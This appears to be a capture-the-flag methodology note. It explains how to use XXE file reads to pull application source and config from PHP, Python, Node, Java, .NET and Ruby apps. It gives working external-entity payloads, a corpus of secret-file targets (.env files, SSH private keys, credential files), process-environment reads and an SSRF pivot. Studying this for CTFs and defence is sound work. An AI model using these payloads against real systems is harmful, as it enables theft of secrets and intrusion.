# Source-Code Read — the read that drives the exploit

## Why source first — the flag is rarely in a flag file

XXE reads files. The flag is usually in an env var, a config, a
database, or a sibling service — the source tells you where. The read
that matters is almost always the app's own source.

## The source-read ladder — per stack

### PHP

```xml
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
<!ENTITY x SYSTEM "file:///var/www/html/index.php">   — may echo raw (parsed/interpreted?)
```

`file://` on `.php` returns the RAW SOURCE — the PHP handler doesn't
re-execute file:// reads. But the raw source may contain `<?php`/`?>`
which breaks the XML echo — `php://filter` base64 is the safe form.

### Python

```
file:///app/main.py
file:///app/app.py
file:///app/wsgi.py
file:///app/config.py
file:///app/settings.py
file:///usr/lib/python3.x/site-packages/
```

No PHP-filter equivalent — read raw; if the source has `<`/`&` —
`cdata-wrapping.md` or error-channel.

### Node

```
file:///app/server.js
file:///app/index.js
file:///app/app.js
file:///app/package.json
file:///app/.env
file:///app/routes/
file:///usr/src/app/
```

### Java

```
file:///app.war!/WEB-INF/web.xml     — jar: scheme
jar:file:///app.war!/WEB-INF/classes/...
file:///app/WEB-INF/web.xml
file:///app/WEB-INF/applicationContext.xml
file:///app/WEB-INF/classes/application.properties
file:///app/WEB-INF/classes/config.yml
file:///opt/tomcat/conf/server.xml
file:///opt/tomcat/conf/context.xml
file:///usr/share/tomcat/conf/server.xml
```

Java source is `.class` — the CONFIG files are the leak:
`application.properties`, `web.xml`, `context.xml`, `struts.xml`,
`spring.xml`, `persistence.xml`, `hibernate.cfg.xml`.

### .NET

```
file:///c:/inetpub/wwwroot/web.config
file:///c:/inetpub/wwwroot/appsettings.json
file:///c:/inetpub/wwwroot/Global.asax
file:///c:/inetpub/wwwroot/packages.config
```

### Ruby

```
file:///app/config/routes.rb
file:///app/config/database.yml
file:///app/config/secrets.yml
file:///app/config/environment.rb
file:///app/.env
```

## The config-file corpus — the secrets path

```
.env .env.local .env.production .env.docker
config/database.yml
config/secrets.yml
config/application.yml
appsettings.json appsettings.Production.json
web.config app.config application.properties
application.yml application-*.properties
settings.py local_settings.py
credentials.json service-account.json
docker-compose.yml Dockerfile
.secrets secrets.yml secrets.json
vault.yml terraform.tfvars
.htpasswd .htaccess
id_rsa id_dsa id_ecdsa id_ed25519
*.pem *.key *.crt *.p12 *.jks *.keystore
```

## The "read a file that reads a file" — the include-chain

Read `index.php` → see `require "config.php"` → read `config.php` →
see `require "/opt/secret/db.php"` → read that → the flag. Each read
names the next path — the include-chain is the source-read's engine.

## The "the flag is behind a getenv()" — env-var hunt

Source shows `getenv("FLAG")` / `os.environ["FLAG"]` /
`process.env.FLAG` / `System.getenv("FLAG")` — the flag is in the
PROCESS environment → `file:///proc/self/environ` — NUL-separated —
the flag lands in the env dump.

## The "the flag is in a sibling service" — URL-read

`config.php` shows `define('FLAG', file_get_contents('http://flag-svc/'))`
— the flag comes from a URL the app itself hits → `http://flag-svc/` /
`http://127.0.0.1:port/` via SSRF — `ssrf-via-xxe.md`.

## The "the flag is in a DB" — the creds-chain

Source shows DB creds → connect via SQLi/`php://filter`-deser → the
flag is in the DB → XXE alone can't query — read the creds, then use
them elsewhere — a chain, not an XXE endpoint.

## The "the flag IS the file name" — `file:///flag{aBc...}`

Some challenges make the flag a filename — `file:///` directory
listing (Java) reveals it — `file:///` on Java lists dirs.

## The "the flag is in a comment" — `<!-- flag -->`

`<!-- flag{...} -->` inside a DTD/template — comments ARE read by
source reads — grep the read for `flag{`.

## The "the flag is in git history" — `.git` read

`file:///var/www/.git/` — objects zlib-compressed — `php://filter/
zlib.inflate` decodes — `file-read-deep.md`'s .git section.

## Record the chain — every hop is evidence

- `index.php` content → evidence `class` "source disclosed"
- `config.php` content → evidence `class`
- the flag → `pre-flag` — verbatim from the response
